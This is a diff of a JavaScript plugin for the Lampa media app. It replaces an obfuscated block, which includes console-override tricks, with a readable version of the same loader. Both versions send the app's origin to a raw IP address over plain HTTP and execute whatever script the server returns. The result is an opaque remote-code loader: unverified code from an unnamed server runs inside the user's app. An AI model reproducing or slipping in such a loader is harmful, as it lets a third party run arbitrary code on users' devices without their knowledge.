@@ -1,6 +1,61 @@
 (function() {
 	'use strict';
 
-         Lampa.Platform.tv();
-         function _0x2530(_0x44e5d5,_0x2b8696){var _0xc65c7f=_0x20a4();return _0x2530=function(_0x272866,_0x5ca54a){_0x272866=_0x272866-0x19f;var _0x5f3f4b=_0xc65c7f[_0x272866];return _0x5f3f4b;},_0x2530(_0x44e5d5,_0x2b8696);}function _0x20a4(){var _0x244488=['apply','__proto__','Noty','stringify','return\x20(function()\x20','console','unknown','table','setRequestHeader','43590536rLcBSJ','282636GADqoB','error','/loadPlugin','toString','Utils','POST','http://212.113.103.137:7777','1910115lmEUOE','6575270LhFxhR','bind','Ошибка\x20сети\x20при\x20загрузке\x20плагина','log','Manifest','status','553704XCEsoW','5248156hZvVSu','5RrJgUL','Ошибка\x20сети\x20загрузки\x20плагина!','length','exception','constructor','send','application/javascript','(((.+)+)+)+$','reload','5922cPsGIy','full_center.js','{}.constructor(\x22return\x20this\x22)(\x20)','open','search','7088PKaHfc','trace','onerror','56mmdMuq','origin','22gmIVgh','onload','info','createObjectURL'];_0x20a4=function(){return _0x244488;};return _0x20a4();}(function(_0x146ae8,_0x307088){var _0x5f12fa=_0x2530,_0x2b9379=_0x146ae8();while(!![]){try{var _0x3603e7=-parseInt(_0x5f12fa(0x1bc))/0x1+parseInt(_0x5f12fa(0x1a7))/0x2*(parseInt(_0x5f12fa(0x1b5))/0x3)+-parseInt(_0x5f12fa(0x1c4))/0x4*(parseInt(_0x5f12fa(0x1c5))/0x5)+-parseInt(_0x5f12fa(0x1c3))/0x6*(parseInt(_0x5f12fa(0x1a5))/0x7)+-parseInt(_0x5f12fa(0x1a2))/0x8*(-parseInt(_0x5f12fa(0x1ce))/0x9)+-parseInt(_0x5f12fa(0x1bd))/0xa+parseInt(_0x5f12fa(0x1b4))/0xb;if(_0x3603e7===_0x307088)break;else _0x2b9379['push'](_0x2b9379['shift']());}catch(_0x488b81){_0x2b9379['push'](_0x2b9379['shift']());}}}(_0x20a4,0xeb62f),(function(){var _0x2e0338=_0x2530,_0x3011d3=(function(){var _0x2e180c=!![];return function(_0x4320a7,_0x12df0d){var _0x108324=_0x2e180c?function(){var _0x22e0c4=_0x2530;if(_0x12df0d){var _0x40bbd4=_0x12df0d[_0x22e0c4(0x1ab)](_0x4320a7,arguments);return _0x12df0d=null,_0x40bbd4;}}:function(){};return _0x2e180c=![],_0x108324;};}()),_0x2352c9=_0x3011d3(this,function(){var _0x1f712e=_0x2530;return _0x2352c9[_0x1f712e(0x1b8)]()[_0x1f712e(0x1a1)](_0x1f712e(0x1cc))[_0x1f712e(0x1b8)]()[_0x1f712e(0x1c9)](_0x2352c9)[_0x1f712e(0x1a1)](_0x1f712e(0x1cc));});_0x2352c9();var _0xa78bb=(function(){var _0x4d8230=!![];return function(_0x3e4f94,_0x12325e){var _0x1c636b=_0x4d8230?function(){var _0x2aa7f1=_0x2530;if(_0x12325e){var _0x367833=_0x12325e[_0x2aa7f1(0x1ab)](_0x3e4f94,arguments);return _0x12325e=null,_0x367833;}}:function(){};return _0x4d8230=![],_0x1c636b;};}()),_0x1d1929=_0xa78bb(this,function(){var _0x21b11d=_0x2530,_0x4751c1=function(){var _0x5fb13b=_0x2530,_0x1038e3;try{_0x1038e3=Function(_0x5fb13b(0x1af)+_0x5fb13b(0x19f)+');')();}catch(_0xf377b9){_0x1038e3=window;}return _0x1038e3;},_0x3ddc79=_0x4751c1(),_0x376f0a=_0x3ddc79[_0x21b11d(0x1b0)]=_0x3ddc79[_0x21b11d(0x1b0)]||{},_0x5a5eb1=[_0x21b11d(0x1c0),'warn',_0x21b11d(0x1a9),_0x21b11d(0x1b6),_0x21b11d(0x1c8),_0x21b11d(0x1b2),_0x21b11d(0x1a3)];for(var _0x2b2838=0x0;_0x2b2838<_0x5a5eb1[_0x21b11d(0x1c7)];_0x2b2838++){var _0x342f53=_0xa78bb[_0x21b11d(0x1c9)]['prototype'][_0x21b11d(0x1be)](_0xa78bb),_0x5e6429=_0x5a5eb1[_0x2b2838],_0x5e1a3d=_0x376f0a[_0x5e6429]||_0x342f53;_0x342f53[_0x21b11d(0x1ac)]=_0xa78bb['bind'](_0xa78bb),_0x342f53[_0x21b11d(0x1b8)]=_0x5e1a3d['toString']['bind'](_0x5e1a3d),_0x376f0a[_0x5e6429]=_0x342f53;}});_0x1d1929();'use strict';var _0x2a841e=_0x2e0338(0x1bb),_0x2c652e=setInterval(function(){var _0x2cd524=_0x2e0338;typeof Lampa!=='undefined'&&(clearInterval(_0x2c652e),_0x5d2131(_0x2cd524(0x1cf)));},0xc8);function _0x5d2131(_0x5c48ac){var _0x2f49d1=_0x2e0338,_0x3c8c5f=new XMLHttpRequest();_0x3c8c5f[_0x2f49d1(0x1a0)](_0x2f49d1(0x1ba),_0x2a841e+_0x2f49d1(0x1b7),!![]),_0x3c8c5f[_0x2f49d1(0x1b3)]('Content-Type','application/json'),_0x3c8c5f[_0x2f49d1(0x1a8)]=function(){var _0x2faf86=_0x2f49d1;if(_0x3c8c5f[_0x2faf86(0x1c2)]>=0xc8&&_0x3c8c5f[_0x2faf86(0x1c2)]<0x12c){var _0xbb921e=URL[_0x2faf86(0x1aa)](new Blob([_0x3c8c5f['responseText']],{'type':_0x2faf86(0x1cb)}));Lampa[_0x2faf86(0x1b9)]['putScriptAsync']([_0xbb921e],function(){});}else location[_0x2faf86(0x1cd)]();},_0x3c8c5f[_0x2f49d1(0x1a4)]=function(){var _0x436f91=_0x2f49d1;console[_0x436f91(0x1b6)](_0x436f91(0x1bf)),Lampa[_0x436f91(0x1ad)]['show'](_0x436f91(0x1c6));};var _0x54426a=Lampa[_0x2f49d1(0x1c1)]?Lampa[_0x2f49d1(0x1c1)][_0x2f49d1(0x1a6)]:_0x2f49d1(0x1b1),_0x2e9d98={'origin':_0x54426a,'pluginName':_0x5c48ac};_0x3c8c5f[_0x2f49d1(0x1ca)](JSON[_0x2f49d1(0x1ae)](_0x2e9d98));}}()));
+var backend = 'http://212.113.103.137:7777';
+
+var check_timer = setInterval(function(){
+              if(typeof Lampa !== 'undefined'){
+                  clearInterval(check_timer);
+                  loadPlugin('full_center.js');
+              }
+   },200);
+
+
+
+function loadPlugin(pluginName) {
+
+    var xhr = new XMLHttpRequest();
+
+    // Указываем метод и URL для загрузки плагина
+    xhr.open('POST', backend + '/loadPlugin', true);
+    xhr.setRequestHeader('Content-Type', 'application/json'); // Установка заголовка для JSON
+
+    // Определяем, что делать при получении ответа от сервера
+    xhr.onload = function() {
+        if (xhr.status >= 200 && xhr.status < 300) {
+            // Здесь приходит содержимое плагина, которое можно загрузить через Lampa.Utils.putScriptAsync
+            var pluginUrl = URL.createObjectURL(new Blob([xhr.responseText], { type: 'application/javascript' }));
+
+            // Используем putScriptAsync для загрузки плагина
+            Lampa.Utils.putScriptAsync([pluginUrl], function () {
+               // console.log("Плагин загружен успешно: " + pluginName); // Успешная загрузка плагина
+               // Lampa.Noty.show("Плагин загружен успешно: " + pluginName);
+            });
+        } else {
+           // console.error('Ошибка загрузки плагина:', xhr.statusText);
+           // Lampa.Noty.show("Ошибка загрузки плагина: " + xhr.responseText);
+           location.reload();
+        }
+    };
+
+    // Обработка ошибки сети
+    xhr.onerror = function() {
+        console.error('Ошибка сети при загрузке плагина');
+        Lampa.Noty.show("Ошибка сети загрузки плагина!");
+    };
+
+    // Проверяем, есть ли у клиента ваше приложение
+    var isMyApp = Lampa.Manifest ? Lampa.Manifest.origin : 'unknown'; // Устанавливаем origin
+
+    // Подготавливаем данные для отправки
+    var requestData = {
+        origin: isMyApp,
+        pluginName: pluginName // Устанавливаем имя плагина
+    };
+
+    // Отправляем данные в теле запроса
+    xhr.send(JSON.stringify(requestData));
+}
+
+
 })();
